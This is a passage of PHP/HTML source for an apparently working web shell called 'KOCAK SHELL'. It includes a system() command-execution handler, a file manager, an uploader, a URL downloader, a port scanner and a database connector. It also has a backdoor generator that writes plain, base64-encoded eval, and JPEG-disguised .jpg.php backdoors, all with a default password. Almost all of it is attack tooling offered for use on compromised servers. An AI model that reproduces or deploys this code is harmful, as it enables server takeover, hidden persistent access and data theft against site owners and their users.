                                    <td class="path-wrap"><?php echo (ini_get('open_basedir') ? ini_get('open_basedir') : "<span class='status-good'>Not enabled</span>"); ?></td>
                                </tr>
                                <tr>
                                    <td><i class="fa-solid fa-ban"></i> Disabled Functions</td>
                                    <td class="path-wrap"><?php echo (ini_get('disable_functions') ? "<div class='disabled-func'>" . ini_get('disable_functions') . "</div>" : "<span class='status-good'>None</span>"); ?></td>
                                </tr>
                            </table>
                        </div>
                    </div>
                    
                    <div class="info-card">
                        <div class="card-header"><i class="fa-solid fa-network-wired"></i> Network Tools</div>
                        <div class="card-content">
                            <table class="info-table">
                                <tr>
                                    <td><i class="fa-solid fa-download"></i> Wget</td>
                                    <td>
                                    <?php 
                                    $wget_status = function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions'))) ? 
                                        (exec('which wget 2>&1', $o, $r) && $r == 0 ? 
                                            "<span class='status-good'><i class='fa-solid fa-circle-check'></i> Available</span>" : 
                                            "<span class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Not available</span>") : 
                                        "<span class='status-unknown'><i class='fa-solid fa-circle-question'></i> Cannot check (exec disabled)</span>";
                                    echo $wget_status;
                                    ?>
                                    </td>
                                </tr>
                                <tr>
                                    <td><i class="fa-solid fa-arrows-spin"></i> Curl</td>
                                    <td>
                                    <?php 
                                    echo function_exists('curl_version') ? 
                                        "<span class='status-good'><i class='fa-solid fa-circle-check'></i> Available</span>" : 
                                        "<span class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Not available</span>"; 
                                    ?>
                                    </td>
                                </tr>
                            </table>
                        </div>
                    </div>
                    
                    <div class="info-card">
                        <div class="card-header"><i class="fa-solid fa-database"></i> Database Support</div>
                        <div class="card-content">
                            <table class="info-table">
                                <tr>
                                    <td><i class="fa-solid fa-database"></i> MySQL</td>
                                    <td>
                                    <?php 
                                    echo function_exists('mysqli_connect') ? 
                                        "<span class='status-good'><i class='fa-solid fa-circle-check'></i> Available</span>" : 
                                        "<span class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Not available</span>";
                                    ?>
                                    </td>
                                </tr>
                                <tr>
                                    <td><i class="fa-solid fa-elephant"></i> PostgreSQL</td>
                                    <td>
                                    <?php 
                                    echo function_exists('pg_connect') ? 
                                        "<span class='status-good'><i class='fa-solid fa-circle-check'></i> Available</span>" : 
                                        "<span class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Not available</span>";
                                    ?>
                                    </td>
                                </tr>
                                <tr>
                                    <td><i class="fa-solid fa-database"></i> SQLite</td>
                                    <td>
                                    <?php 
                                    echo class_exists('SQLite3') ? 
                                        "<span class='status-good'><i class='fa-solid fa-circle-check'></i> Available</span>" : 
                                        "<span class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Not available</span>";
                                    ?>
                                    </td>
                                </tr>
                            </table>
                        </div>
                    </div>
                    
                    <?php 
                    $total_space = function_exists('disk_total_space') ? @disk_total_space($current_dir) : "Unknown";
                    $free_space = function_exists('disk_free_space') ? @disk_free_space($current_dir) : "Unknown";
                    if($total_space != "Unknown") {
                        $total_space_gb = round($total_space / 1073741824, 2);
                        $free_space_gb = round($free_space / 1073741824, 2);
                        $used_space_gb = $total_space_gb - $free_space_gb;
                        $used_percent = round(($used_space_gb / $total_space_gb) * 100);
                        
                        echo '
                        <div class="info-card">
                            <div class="card-header"><i class="fa-solid fa-hard-drive"></i> Disk Space</div>
                            <div class="card-content">
                                <table class="info-table">
                                    <tr>
                                        <td><i class="fa-solid fa-chart-pie"></i> Total</td>
                                        <td>' . $total_space_gb . ' GB</td>
                                    </tr>
                                    <tr>
                                        <td><i class="fa-solid fa-check-circle"></i> Free</td>
                                        <td>' . $free_space_gb . ' GB</td>
                                    </tr>
                                    <tr>
                                        <td><i class="fa-solid fa-database"></i> Used</td>
                                        <td>' . $used_space_gb . ' GB (' . $used_percent . '%)</td>
                                    </tr>
                                </table>
                                <div class="disk-bar-container">
                                    <div class="disk-bar" style="width: ' . $used_percent . '%"></div>
                                </div>
                            </div>
                        </div>';
                    }
                    ?>
                </div>
            </div>
        </div>

        <!-- SECTION 2: FILE MANAGER -->
        <div class="section">
            <h2 class="section-header"><i class="fa-solid fa-folder-open"></i> File Manager</h2>

            <!-- Path breadcrumbs -->
            <div class='breadcrumb'>
                <b>Path:</b> 
                <?php
                // Properly handle breadcrumb paths for Windows and Unix
                global $is_windows;
                
                // Normalize path for display
                $display_path = normalizePath($path);
                
                // Split path based on OS
                $path_parts = $is_windows ? explode('\\', $display_path) : explode('/', $display_path);
                $breadcrumb = '';
                
                // Display drive letter separately for Windows
                if ($is_windows && isset($path_parts[0]) && strpos($path_parts[0], ':') !== false) {
                    echo "<a href='?path=" . $path_parts[0] . "\\'>".htmlspecialchars($path_parts[0])."</a>\\";
                    // Skip the drive part in the loop
                    array_shift($path_parts);
                    $breadcrumb = $path_parts[0] . '\\';
                }
                
                foreach($path_parts as $key => $part) {
                    if(empty($part)) continue;
                    
                    if ($is_windows) {
                        $breadcrumb .= empty($breadcrumb) ? $part : '\\' . $part;
                        echo "<a href='?path=" . $breadcrumb . "'>" . htmlspecialchars($part) . "</a>\\";
                    } else {
                        $breadcrumb .= '/' . $part;
                        echo "<a href='?path=" . $breadcrumb . "'>" . htmlspecialchars($part) . "</a>/";
                    }
                }
                ?>
            </div>
            
            <!-- File operations menu -->
            <div style='margin-bottom: 15px;'>
                <button onclick="location.href='?path=<?php echo $path; ?>&op=newdir'"><i class="fa-solid fa-folder-plus"></i> New Directory</button>
                <button onclick="location.href='?path=<?php echo $path; ?>&op=newfile'"><i class="fa-solid fa-file-circle-plus"></i> New File</button>
                <button onclick="openCommandModal()"><i class="fa-solid fa-terminal"></i> Execute Command</button>
            </div>
            
            <!-- Handle file operations -->
            <?php
            if(isset($_GET['op'])) {
                $op = $_GET['op'];
                
                if($op == 'newdir') {
                    ?>
                    <h3>Create New Directory</h3>
                    <form method="POST" action="?path=<?php echo $path; ?>&op=mkdir">
                        <input type="text" name="dirname" placeholder="Directory Name" required>
                        <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
                        <input type="submit" value="Create">
                    </form>
                    <hr>
                    <?php
                } elseif($op == 'newfile') {
                    ?>
                    <h3>Create New File</h3>
                    <form method="POST" action="?path=<?php echo $path; ?>&op=mkfile">
                        <input type="text" name="filename" placeholder="File Name" required><br><br>
                        <textarea name="content"></textarea><br>
                        <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
                        <input type="submit" value="Create">
                    </form>
                    <hr>
                    <?php
                } elseif($op == 'edit' && isset($_GET['file'])) {
                    $file = urldecode($_GET['file']);
                    if(file_exists($file) && !is_dir($file)) {
                        $content = htmlspecialchars(file_get_contents($file));
                        ?>
                        <h3>Edit File: <?php echo htmlspecialchars(basename($file)); ?></h3>
                        <form method="POST" action="?op=edit&file=<?php echo $file; ?>&path=<?php echo $path; ?>">
                            <textarea name="content"><?php echo $content; ?></textarea><br>
                            <input type="submit" value="Save">
                        </form>
                        <hr>
                        <?php
                    }
                } elseif($op == 'chmod' && isset($_GET['file'])) {
                    $file = urldecode($_GET['file']);
                    $current_perms = substr(sprintf('%o', fileperms($file)), -4);
                    ?>
                    <h3>Change Permissions: <?php echo htmlspecialchars(basename($file)); ?></h3>
                    <form method="POST" action="?op=chmod&file=<?php echo $file; ?>&path=<?php echo $path; ?>">
                        <input type="text" name="perms" value="<?php echo $current_perms; ?>" placeholder="e.g. 0755">
                        <input type="submit" value="Change">
                    </form>
                    <hr>
                    <?php
                } elseif($op == 'rename' && isset($_GET['file'])) {
                    $file = urldecode($_GET['file']);
                    $filename = basename($file);
                    ?>
                    <h3>Rename: <?php echo htmlspecialchars($filename); ?></h3>
                    <form method="POST" action="?op=rename&file=<?php echo $file; ?>&path=<?php echo $path; ?>">
                        <input type="text" name="newname" value="<?php echo htmlspecialchars($filename); ?>">
                        <input type="submit" value="Rename">
                    </form>
                    <hr>
                    <?php
                }
            }
            ?>
            
            <!-- File listing -->
            <table class='file-table'>
                <tr>
                    <th><i class="fa-solid fa-icons"></i></th>
                    <th><i class="fa-solid fa-file-signature"></i> Name</th>
                    <th><i class="fa-solid fa-weight-scale"></i> Size</th>
                    <th><i class="fa-solid fa-lock"></i> Permissions</th>
                    <th><i class="fa-solid fa-users"></i> Owner/Group</th>
                    <th><i class="fa-solid fa-clock"></i> Last Modified</th>
                    <th><i class="fa-solid fa-gears"></i> Actions</th>
                </tr>
                
                <?php
                // Parent directory link
                $parentDir = dirname($path);
                echo "<tr>";
                echo "<td><i class='fa-solid fa-folder-open' style='color: #ffcc00;'></i></td>";
                echo "<td><a href='?path=" . $parentDir . "'>.. (Parent Directory)</a></td>";
                echo "<td>--</td>";
                echo "<td>--</td>";
                echo "<td>--</td>";
                echo "<td>--</td>";
                echo "<td>--</td>";
                echo "</tr>";
                
                // List files and directories
                $files = scandir($path);
                foreach($files as $file) {
                    if($file == '.' || $file == '..') continue;
                    
                    $fullpath = $path . '/' . $file;
                    $is_dir = is_dir($fullpath);
                    $size = $is_dir ? '--' : formatSize(filesize($fullpath));
                    $perms = getPerms($fullpath);
                    
                    // Get owner and group
                    $owner = function_exists('posix_getpwuid') ? @posix_getpwuid(fileowner($fullpath)) : array('name' => fileowner($fullpath));
                    $group = function_exists('posix_getgrgid') ? @posix_getgrgid(filegroup($fullpath)) : array('name' => filegroup($fullpath));
                    
                    echo "<tr>";
                    echo "<td>" . getIcon($fullpath) . "</td>";
                    echo "<td>" . ($is_dir ? 
                            "<a href='?path=" . $fullpath . "'>" . htmlspecialchars($file) . "</a>" : 
                            htmlspecialchars($file)) . "</td>";
                    echo "<td>" . $size . "</td>";
                    echo "<td>" . $perms . "</td>";
                    echo "<td>" . $owner['name'] . "/" . $group['name'] . "</td>";
                    echo "<td>" . date("Y-m-d H:i:s", filemtime($fullpath)) . "</td>";
                    echo "<td class='file-actions'>";
                    
                    // File actions
                    if(!$is_dir) {
                        echo "<a href='?path=" . $path . "&op=edit&file=" . $fullpath . "' title='Edit'><i class='fa-solid fa-pen-to-square' style='color: #33ff33; margin: 0 5px;'></i></a>";
                        echo "<a href='" . htmlspecialchars($fullpath) . "' download title='Download'><i class='fa-solid fa-download' style='color: #3498db; margin: 0 5px;'></i></a>";
                    }
                    echo "<a href='?path=" . $path . "&op=chmod&file=" . $fullpath . "' title='Change Permission'><i class='fa-solid fa-key' style='color: #f39c12; margin: 0 5px;'></i></a>";
                    echo "<a href='?path=" . $path . "&op=rename&file=" . $fullpath . "' title='Rename'><i class='fa-solid fa-signature' style='color: #9b59b6; margin: 0 5px;'></i></a>";
                    echo "<a href='?path=" . $path . "&op=delete&file=" . $fullpath . "' onclick='return confirm(\"Are you sure you want to delete this file?\")' title='Delete'><i class='fa-solid fa-trash' style='color: #e74c3c; margin: 0 5px;'></i></a>";
                    echo "</td>";
                    echo "</tr>";
                }
                ?>
            </table>
        </div>

        <!-- SECTION 3: TOOLS -->
        <div class="section">
            <h2 class="section-header"><i class="fa-solid fa-toolbox"></i> Tools</h2>
            <div class="tools-buttons">
                <!-- Tool Buttons -->
                <button class="tool-button" onclick="openCommandModal()">
                    <i class="fa-solid fa-terminal"></i>
                    <span>Command</span>
                </button>
                <button class="tool-button" onclick="openUploadModal()">
                    <i class="fa-solid fa-upload"></i>
                    <span>Uploader</span>
                </button>
                <button class="tool-button" onclick="openNetworkModal()">
                    <i class="fa-solid fa-globe"></i>
                    <span>Network</span>
                </button>
                <button class="tool-button" onclick="openBackdoorModal()">
                    <i class="fa-solid fa-door-open"></i>
                    <span>Backdoor</span>
                </button>
                <button class="tool-button" onclick="openEncodeModal()">
                    <i class="fa-solid fa-lock"></i>
                    <span>Encoder</span>
                </button>
                <button class="tool-button" onclick="openDatabaseModal()">
                    <i class="fa-solid fa-database"></i>
                    <span>Database</span>
                </button>
            </div>
        </div>

        <!-- Modal for Command Execution -->
        <div id="cmdModal" class="modal">
            <div class="modal-content">
                <span class="close-btn" onclick="closeModal('cmdModal')">&times;</span>
                <h3><i class="fa-solid fa-terminal"></i> Command Execution</h3>
                <form onsubmit="return executeCommand(this);">
                    <input type="text" name="cmd" placeholder="Command..." style="width:80%">
                    <input type="submit" value="Run">
                </form>
                <div id="cmdResult" class="command-result">
                    <!-- Command output will appear here -->
                </div>
            </div>
        </div>
        
        <?php
        // AJAX handler for command execution
        if (isset($_POST['cmd']) && isset($_POST['ajax'])) {
            ob_start();
            echo '<div id="cmd-output"><pre>';
            system($_POST['cmd']);
            echo '</pre></div>';
            $output = ob_get_clean();
            
            if (isset($_POST['ajax'])) {
                echo '<div class="ajax-result">' . $output . '</div>';
                exit; // Stop further execution to return only the result
            }
        }
        ?>
        
        <!-- Modal for File Upload -->
        <div id="uploadModal" class="modal">
            <div class="modal-content">
                <span class="close-btn" onclick="closeModal('uploadModal')">&times;</span>
                <h3><i class="fa-solid fa-upload"></i> File Uploader</h3>
                <form method="POST" enctype="multipart/form-data" onsubmit="return uploadFile(this);">
                    <input type="file" name="file">
                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
                    <input type="submit" value="Upload">
                </form>
                <p><small>Upload directory: <?php echo htmlspecialchars($path); ?></small></p>
                <div id="uploadResult" class="result-box" style="display:none;">
                    <!-- Upload result will appear here -->
                </div>
            </div>
        </div>
        
        <!-- Modal for Network Tools -->
        <div id="networkModal" class="modal">
            <div class="modal-content">
                <span class="close-btn" onclick="closeModal('networkModal')">&times;</span>
                <h3><i class="fa-solid fa-globe"></i> Network Tools</h3>
                
                <div class="tool-section">
                    <h4><i class="fa-solid fa-download"></i> File Downloader</h4>
                    <form onsubmit="return submitNetworkAction(this, 'networkResult');">
                        <input type="text" name="url" placeholder="URL (http://example.com/file.txt)" style="width:80%">
                        <input type="text" name="filename" placeholder="Save as filename" style="width:40%">
                        <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
                        <input type="hidden" name="network_action" value="download">
                        <input type="submit" value="Download">
                    </form>
                </div>
                
                <div class="tool-section">
                    <h4><i class="fa-solid fa-satellite-dish"></i> Port Scanner</h4>
                    <form onsubmit="return submitNetworkAction(this, 'networkResult');">
                        <input type="text" name="target" placeholder="Target (e.g., 127.0.0.1)" style="width:50%">
                        <input type="text" name="ports" placeholder="Ports (e.g., 21,22,80,443)" style="width:50%">
                        <input type="hidden" name="network_action" value="portscan">
                        <input type="submit" value="Scan">
                    </form>
                </div>
                
                <div id="networkResult" class="result-box" style="display:none;">
                    <!-- Network tool results will appear here -->
                </div>
                
                <?php
                // Network tools handler
                if(isset($_POST['network_action'])) {
                    // Start output buffering if this is an AJAX request
                    if(isset($_POST['ajax'])) {
                        ob_start();
                        echo '<div id="network-output">';
                    }
                    
                    echo "<div class='result-box'>";
                    if($_POST['network_action'] == 'download' && !empty($_POST['url'])) {
                        $url = $_POST['url'];
                        $save_as = !empty($_POST['filename']) ? $_POST['filename'] : basename($url);
                        $save_path = $path . '/' . $save_as;
                        
                        echo "<h4>Download Result:</h4>";
                        if(function_exists('curl_init')) {
                            $ch = curl_init($url);
                            $fp = fopen($save_path, 'wb');
                            curl_setopt($ch, CURLOPT_FILE, $fp);
                            curl_setopt($ch, CURLOPT_HEADER, 0);
                            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                            curl_exec($ch);
                            if(curl_error($ch)) {
                                echo "Error: " . curl_error($ch);
                            } else {
                                echo "File downloaded successfully to: " . htmlspecialchars($save_path);
                            }
                            curl_close($ch);
                            fclose($fp);
                        } elseif(ini_get('allow_url_fopen')) {
                            if(copy($url, $save_path)) {
                                echo "File downloaded successfully to: " . htmlspecialchars($save_path);
                            } else {
                                echo "Error downloading file!";
                            }
                        } else {
                            echo "Neither cURL nor allow_url_fopen is enabled!";
                        }
                    } elseif($_POST['network_action'] == 'portscan' && !empty($_POST['target'])) {
                        $target = $_POST['target'];
                        $ports = !empty($_POST['ports']) ? explode(',', $_POST['ports']) : array(21, 22, 23, 25, 80, 443, 3306, 8080);
                        
                        echo "<h4>Port Scan Result for $target:</h4>";
                        echo "<pre>";
                        foreach($ports as $port) {
                            $port = trim($port);
                            if(is_numeric($port)) {
                                $conn = @fsockopen($target, $port, $errno, $errstr, 1);
                                if($conn) {
                                    echo "Port $port: <span class='status-good'><i class='fa-solid fa-circle-check'></i> Open</span>\n";
                                    fclose($conn);
                                } else {
                                    echo "Port $port: <span class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Closed</span>\n";
                                }
                            }
                        }
                        echo "</pre>";
                    }
                    echo "</div>";
                    
                    // Complete output buffering if this is an AJAX request
                    if(isset($_POST['ajax'])) {
                        echo '</div>';
                        $output = ob_get_clean();
                        echo '<div class="ajax-result">' . $output . '</div>';
                        exit; // Stop further execution to return only the result
                    }
                }
                ?>
            </div>
        </div>
        
        <!-- Modal for Backdoor Generator -->
        <div id="backdoorModal" class="modal">
            <div class="modal-content">
                <span class="close-btn" onclick="closeModal('backdoorModal')">&times;</span>
                <h3><i class="fa-solid fa-door-open"></i> Backdoor Generator</h3>
                
                <div class="tool-section">
                    <form onsubmit="return submitBackdoorAction(this, 'backdoorResult');">
                        <label><input type="radio" name="backdoor_type" value="simple" checked> Simple PHP Backdoor</label>
                        <label><input type="radio" name="backdoor_type" value="stealth"> Stealth Backdoor (encoded)</label>
                        <label><input type="radio" name="backdoor_type" value="image"> Image Backdoor (JPEG)</label><br><br>
                        
                        <label>Filename:</label>
                        <input type="text" name="backdoor_filename" value="shell.php" style="width:50%"><br><br>
                        
                        <label>Password:</label>
                        <input type="text" name="backdoor_password" value="kocak123" style="width:50%"><br><br>
                        
                        <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
                        <input type="hidden" name="backdoor_action" value="generate">
                        <input type="submit" value="Generate">
                    </form>
                </div>
                
                <div id="backdoorResult" class="result-box" style="display:none;">
                    <!-- Backdoor generator results will appear here -->
                </div>
                
                <?php
                // Backdoor generator handler
                if(isset($_POST['backdoor_action']) && $_POST['backdoor_action'] == 'generate') {
                    // Start output buffering if this is an AJAX request
                    if(isset($_POST['ajax'])) {
                        ob_start();
                        echo '<div id="backdoor-output">';
                    }
                    
                    $backdoor_type = $_POST['backdoor_type'] ?? 'simple';
                    $filename = $_POST['backdoor_filename'] ?? 'shell.php';
                    $password = $_POST['backdoor_password'] ?? 'kocak123';
                    $save_path = $path . '/' . $filename;
                    
                    echo "<div class='result-box'>";
                    echo "<h4>Backdoor Generation Result:</h4>";
                    
                    // Simple backdoor code
                    $simple_code = '<?php if(isset($_REQUEST["' . $password . '"])) { system($_REQUEST["' . $password . '"]); } ?>';
                    
                    // Stealth backdoor (base64 encoded)
                    $stealth_code = '<?php $x=base64_decode("' . base64_encode('if(isset($_REQUEST["' . $password . '"])) { system($_REQUEST["' . $password . '"]); }') . '");eval($x); ?>';
                    
                    // Image backdoor (JPEG)
                    $image_code = "\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xDB\x00\x43\x00\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xC0\x00\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00\xFF\xC4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xFF\xC4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDA\x00\x08\x01\x01\x00\x00\x3F\x00\x7F\x00\xFF\xD9" . 
                                "<?php if(isset(\$_REQUEST['" . $password . "'])) { system(\$_REQUEST['" . $password . "']); } ?>";
                    
                    switch($backdoor_type) {
                        case 'simple':
                            $code = $simple_code;
                            break;
                        case 'stealth':
                            $code = $stealth_code;
                            break;
                        case 'image':
                            $code = $image_code;
                            $save_path = $path . '/' . str_replace('.php', '.jpg.php', $filename);
                            break;
                    }
                    
                    if(file_put_contents($save_path, $code)) {
                        echo "Backdoor created successfully at: " . htmlspecialchars($save_path);
                        echo "<p><b>Usage:</b> " . htmlspecialchars($save_path . "?" . $password . "=id") . "</p>";
                    } else {
                        echo "Error creating backdoor!";
                    }
                    
                    echo "</div>";
                    
                    // Complete output buffering if this is an AJAX request
                    if(isset($_POST['ajax'])) {
                        echo '</div>';
                        $output = ob_get_clean();
                        echo '<div class="ajax-result">' . $output . '</div>';
                        exit; // Stop further execution to return only the result
                    }
                }
                ?>
            </div>
        </div>
        
        <!-- Modal for Encoder/Decoder -->
        <div id="encodeModal" class="modal">
            <div class="modal-content">
                <span class="close-btn" onclick="closeModal('encodeModal')">&times;</span>
                <h3><i class="fa-solid fa-lock"></i> Encoder/Decoder</h3>
                
                <div class="tool-section">
                    <form onsubmit="return submitEncoderAction(this, 'encoderResult');">
                        <textarea name="text_input" style="width:100%; height:150px;" placeholder="Text to encode/decode"></textarea><br>
                        
                        <div class="encode-options">
                            <label><input type="radio" name="encode_action" value="base64_encode" checked> Base64 Encode</label>
                            <label><input type="radio" name="encode_action" value="base64_decode"> Base64 Decode</label>
                            <label><input type="radio" name="encode_action" value="md5"> MD5 Hash</label>
                            <label><input type="radio" name="encode_action" value="sha1"> SHA1 Hash</label>
                            <label><input type="radio" name="encode_action" value="url_encode"> URL Encode</label>
                            <label><input type="radio" name="encode_action" value="url_decode"> URL Decode</label>
                            <label><input type="radio" name="encode_action" value="hex_encode"> Hex Encode</label>
                            <label><input type="radio" name="encode_action" value="hex_decode"> Hex Decode</label>
                        </div>
                        
                        <input type="hidden" name="encoder_submitted" value="1">
                        <input type="submit" value="Process">
                    </form>
                </div>
                
                <div id="encoderResult" class="result-box" style="display:none;">
                    <!-- Encoder/Decoder results will appear here -->
                </div>
                
                <?php
                // Encoder/Decoder handler
                if(isset($_POST['encoder_submitted']) && !empty($_POST['text_input'])) {
                    // Start output buffering if this is an AJAX request
                    if(isset($_POST['ajax'])) {
                        ob_start();
                        echo '<div id="encoder-output">';
                    }
                    
                    $input = $_POST['text_input'];
                    $action = $_POST['encode_action'] ?? 'base64_encode';
                    $result = "";
                    
                    switch($action) {
                        case 'base64_encode':
                            $result = base64_encode($input);
                            break;
                        case 'base64_decode':
                            $result = base64_decode($input);
                            break;
                        case 'md5':
                            $result = md5($input);
                            break;
                        case 'sha1':
                            $result = sha1($input);
                            break;
                        case 'url_encode':
                            $result = urlencode($input);
                            break;
                        case 'url_decode':
                            $result = urldecode($input);
                            break;
                        case 'hex_encode':
                            $result = bin2hex($input);
                            break;
                        case 'hex_decode':
                            $result = pack("H*", $input);
                            break;
                    }
                    
                    echo "<div class='result-box'>";
                    echo "<h4>Result:</h4>";
                    echo "<textarea style='width:100%; height:150px;'>" . htmlspecialchars($result) . "</textarea>";
                    echo "</div>";
                    
                    // Complete output buffering if this is an AJAX request
                    if(isset($_POST['ajax'])) {
                        echo '</div>';
                        $output = ob_get_clean();
                        echo '<div class="ajax-result">' . $output . '</div>';
                        exit; // Stop further execution to return only the result
                    }
                }
                ?>
            </div>
        </div>
        
        <!-- Modal for Database Manager -->
        <div id="databaseModal" class="modal">
            <div class="modal-content large-modal">
                <span class="close-btn" onclick="closeModal('databaseModal')">&times;</span>
                <h3><i class="fa-solid fa-database"></i> Database Manager</h3>
                
                <div class="tool-section">
                    <!-- Database Connection -->
                    <h4><i class="fa-solid fa-plug"></i> Connect to Database</h4>
                    <form onsubmit="return submitDatabaseAction(this, 'databaseResult');">
                        <div class="form-grid">
                            <div>
                                <label>Database Type:</label>
                                <select name="db_type">
                                    <option value="mysql">MySQL</option>
                                    <option value="pgsql">PostgreSQL</option>
                                    <option value="sqlite">SQLite</option>
                                </select>
                            </div>
                            
                            <div>
                                <label>Host:</label>
                                <input type="text" name="db_host" value="localhost">
                            </div>
                            
                            <div>
                                <label>User:</label>
                                <input type="text" name="db_user" value="root">
                            </div>
                            
                            <div>
                                <label>Password:</label>
                                <input type="password" name="db_pass" value="">
                            </div>
                            
                            <div>
                                <label>Database Name:</label>
                                <input type="text" name="db_name" value="">
                            </div>
                            
                            <div>
                                <label>Port:</label>
                                <input type="text" name="db_port" value="3306">
                            </div>
                        </div>
                        
                        <input type="hidden" name="db_action" value="connect">
                        <input type="submit" value="Connect">
                    </form>
                </div>
                
                <div id="databaseResult" class="result-box" style="display:none;">
                    <!-- Database connection results will appear here -->
                </div>
                
                <?php
                // Database manager handler (simplified, would be expanded in a real implementation)
                if(isset($_POST['db_action']) && $_POST['db_action'] == 'connect') {
                    // Start output buffering if this is an AJAX request
                    if(isset($_POST['ajax'])) {
                        ob_start();
                        echo '<div id="database-output">';
                    }
                
                    echo "<div class='result-box'>";
                    echo "<h4>Database Connection Result:</h4>";
                    
                    $db_type = $_POST['db_type'] ?? 'mysql';
                    $db_host = $_POST['db_host'] ?? 'localhost';
                    $db_user = $_POST['db_user'] ?? 'root';
                    $db_pass = $_POST['db_pass'] ?? '';
                    $db_name = $_POST['db_name'] ?? '';
                    $db_port = $_POST['db_port'] ?? '3306';
                    
                    try {
                        $connected = false;
                        
                        if($db_type == 'mysql' && function_exists('mysqli_connect')) {
                            $conn = @mysqli_connect($db_host, $db_user, $db_pass, $db_name, $db_port);
                            if($conn) {
                                echo "<p class='status-good'><i class='fa-solid fa-circle-check'></i> Connected to MySQL successfully!</p>";
                                $connected = true;
                                
                                // Show databases

                                $result = mysqli_query($conn, "SHOW DATABASES");
                                echo "<h4>Available Databases:</h4>";
                                echo "<ul class='db-list'>";
                                while($row = mysqli_fetch_array($result)) {
                                    echo "<li><i class='fa-solid fa-database'></i> " . htmlspecialchars($row[0]) . "</li>";
                                }
                                echo "</ul>";
                                
                                mysqli_close($conn);
                            }
                        } elseif($db_type == 'pgsql' && function_exists('pg_connect')) {
                            $conn_string = "host=$db_host port=$db_port dbname=$db_name user=$db_user password=$db_pass";
                            $conn = @pg_connect($conn_string);
                            if($conn) {
                                echo "<p class='status-good'><i class='fa-solid fa-circle-check'></i> Connected to PostgreSQL successfully!</p>";
                                $connected = true;
                                pg_close($conn);
                            }
                        } elseif($db_type == 'sqlite' && class_exists('SQLite3')) {
                            if(!empty($db_name)) {
                                $conn = new SQLite3($db_name);
                                echo "<p class='status-good'><i class='fa-solid fa-circle-check'></i> Connected to SQLite successfully!</p>";
                                $connected = true;
                                $conn->close();
                            } else {
                                echo "<p class='status-bad'><i class='fa-solid fa-circle-xmark'></i> SQLite database name is required!</p>";
                            }
                        }
                        
                        if(!$connected) {
                            echo "<p class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Connection failed! Check your credentials or database server.</p>";
                        }
                    } catch(Exception $e) {
                        echo "<p class='status-bad'><i class='fa-solid fa-circle-xmark'></i> Error: " . htmlspecialchars($e->getMessage()) . "</p>";
                    }
                    
                    echo "</div>";
                    
                    // Complete output buffering if this is an AJAX request
                    if(isset($_POST['ajax'])) {
                        echo '</div>';
                        $output = ob_get_clean();
                        echo '<div class="ajax-result">' . $output . '</div>';
                        exit; // Stop further execution to return only the result
                    }
                }
                ?>
            </div>
        </div>

        <div class="footer">
            <i class="fa-solid fa-copyright"></i> 2025 KOCAK SHELL | Created with <i class="fa-solid fa-heart" style="color: #e74c3c;"></i>
        </div>
    </div>
</body>
</html>
